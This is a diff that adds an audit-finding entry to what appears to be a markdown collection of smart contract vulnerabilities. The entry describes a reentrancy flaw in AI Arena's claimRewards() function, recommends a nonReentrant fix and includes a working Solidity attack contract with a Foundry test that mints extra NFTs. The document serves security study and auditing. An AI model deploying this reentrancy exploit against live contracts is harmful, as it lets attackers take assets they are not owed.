@@ -355,3 +355,122 @@ Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining
   ```
 
   </details>
+
+## 5. [High] Player can mint more fighter NFTs during claim of rewards by leveraging reentrancy on the claimRewards() function
+
+### Reentrancy by roundId
+
+- Summary: A reentrancy vulnerability in the `claimRewards` function allows a malicious user to mint more fighter NFTs than they are entitled to. By using a smart contract, a user can repeatedly reenter the function during the reward claim process, resulting in excessive minting of NFTs stems from the `roundId`.
+- Impact & Recommendation: Use a `nonReentrant` modifier for the `claimRewards` function.
+  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-ai-arena#h-08-player-can-mint-more-fighter-nfts-during-claim-of-rewards-by-leveraging-reentrancy-on-the-claimrewards-function) & [Report](https://code4rena.com/reports/2024-02-ai-arena)
+
+  <details><summary>POC</summary>
+
+  ```solidity
+    import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+    contract Attack is IERC721Receiver {
+
+        address owner;
+        uint256 tickets = 0;
+        MergingPool mergingPool;
+        FighterFarm fighterFarm;
+        constructor(address mergingPool_, address fighterFarm_) {
+            mergingPool = MergingPool(mergingPool_);
+            fighterFarm = FighterFarm(fighterFarm_);
+            owner = msg.sender;
+        }
+        function reenter() internal {
+            ++tickets;
+            if (tickets < 100) {
+                (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
+                mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
+            }
+        }
+        function onERC721Received(address, address, uint256 tokenId, bytes calldata) public returns (bytes4) {
+            reenter();
+            return IERC721Receiver.onERC721Received.selector;
+        }
+        function attack() public {
+            (string[] memory _modelURIs, string[] memory _modelTypes, uint256[2][] memory _customAttributes) = setInformation();
+            mergingPool.claimRewards(_modelURIs, _modelTypes, _customAttributes);
+        }
+        function setInformation() public pure returns (string[] memory, string[] memory, uint256[2][] memory) {
+            string[] memory _modelURIs = new string[](3);
+            _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
+            _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
+            _modelURIs[2] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
+            string[] memory _modelTypes = new string[](3);
+            _modelTypes[0] = "original";
+            _modelTypes[1] = "original";
+            _modelTypes[2] = "original";
+            uint256[2][] memory _customAttributes = new uint256[2][](3);
+            _customAttributes[0][0] = uint256(1);
+            _customAttributes[0][1] = uint256(80);
+            _customAttributes[1][0] = uint256(1);
+            _customAttributes[1][1] = uint256(80);
+            _customAttributes[2][0] = uint256(1);
+            _customAttributes[2][1] = uint256(80);
+            return (_modelURIs, _modelTypes, _customAttributes);
+        }
+    }
+
+  ```
+
+  ```solidity
+      function testReenterPOC() public {
+        address Bob = makeAddr("Bob");
+        Attack attacker = new Attack(address(_mergingPoolContract), address(_fighterFarmContract));
+
+        _mintFromMergingPool(address(attacker));
+        _mintFromMergingPool(Bob);
+        assertEq(_fighterFarmContract.ownerOf(0), address(attacker));
+        assertEq(_fighterFarmContract.ownerOf(1), Bob);
+        uint256[] memory _winners = new uint256[](2);
+        _winners[0] = 0;
+        _winners[1] = 1;
+         // winners of roundId 0 are picked
+        _mergingPoolContract.pickWinner(_winners);
+        assertEq(_mergingPoolContract.isSelectionComplete(0), true);
+        assertEq(_mergingPoolContract.winnerAddresses(0, 0) == address(attacker), true);
+        // winner matches ownerOf tokenId
+        assertEq(_mergingPoolContract.winnerAddresses(0, 1) == Bob, true);
+        string[] memory _modelURIs = new string[](2);
+        _modelURIs[0] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
+        _modelURIs[1] = "ipfs://bafybeiaatcgqvzvz3wrjiqmz2ivcu2c5sqxgipv5w2hzy4pdlw7hfox42m";
+
+        string[] memory _modelTypes = new string[](2);
+        _modelTypes[0] = "original";
+        _modelTypes[1] = "original";
+        uint256[2][] memory _customAttributes = new uint256[2][](2);
+        _customAttributes[0][0] = uint256(1);
+        _customAttributes[0][1] = uint256(80);
+        _customAttributes[1][0] = uint256(1);
+        _customAttributes[1][1] = uint256(80);
+        // winners of roundId 1 are picked
+        uint256 numberOfRounds = _mergingPoolContract.roundId();
+        console.log("Number of Rounds: ", numberOfRounds);
+        _mergingPoolContract.pickWinner(_winners);
+        _mergingPoolContract.pickWinner(_winners);
+        console.log("------------------------------------------------------");
+        console.log("Balance of attacker (Alice) address pre-claim rewards: ", _fighterFarmContract.balanceOf(address(attacker)));
+        // console.log("Balance of Bob address pre-claim rewards: ", _fighterFarmContract.balanceOf(Bob));
+        uint256 numRewardsForAttacker = _mergingPoolContract.getUnclaimedRewards(address(attacker));
+
+        // uint256 numRewardsForBob = _mergingPoolContract.getUnclaimedRewards(Bob);
+        console.log("------------------------------------------------------");
+        console.log("Number of unclaimed rewards attacker (Alice) address has a claim to: ", numRewardsForAttacker);
+        // console.log("Number of unclaimed rewards Bob address has a claim to: ", numRewardsForBob);
+
+        // vm.prank(Bob);
+        // _mergingPoolContract.claimRewards(_modelURIs, _modelTypes, _customAttributes);
+        vm.prank(address(attacker));
+        attacker.attack();
+        uint256 balanceOfAttackerPostClaim = _fighterFarmContract.balanceOf(address(attacker));
+        console.log("------------------------------------------------------");
+        console.log("Balance of attacker (Alice) address post-claim rewards: ", balanceOfAttackerPostClaim);
+        // console.log("Balance of Bob address post-claim rewards: ", _fighterFarmContract.balanceOf(Bob));
+    }
+
+  ```
+
+  </details>
